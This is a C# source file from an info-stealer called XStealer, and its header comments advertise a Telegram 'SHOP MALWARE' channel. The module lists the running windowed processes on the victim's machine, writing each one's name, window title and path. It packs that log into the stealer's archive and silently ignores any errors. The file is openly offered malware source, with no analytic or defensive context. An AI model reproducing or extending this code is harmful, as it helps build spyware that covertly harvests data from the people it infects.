// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Machine
{
    using System.Diagnostics;
    using System.IO;
    using System.Linq;
    using System.Text;
    using Helpers;

    public static class ProcessInfo
    {
        public static void Inizialize()
        {
            using var ms = new MemoryStream { Position = 0 };
            try
            {
                Process[] processlist = Process.GetProcesses();
                using var build = new StreamWriter(ms, Encoding.UTF8);
                foreach (Process process in processlist.Where(process => !string.IsNullOrEmpty(process.MainWindowTitle)))
                {
                    try
                    {
                        build.WriteLine($"Process Name: {process.ProcessName}.exe");
                        build.WriteLine($"Process Tittle: {process.MainWindowTitle}");
                        build.WriteLine($"Process Path: {FileX.GetMainModuleFileName(process)}\r\n");
                    }
                    catch { continue; }
                }
                ZipEx.AddKeyPairStream("ProcessInfo_Log.txt", ms?.ToArray() ?? ms.GetBuffer() ?? null);
            }
            catch { }
        }
    }
}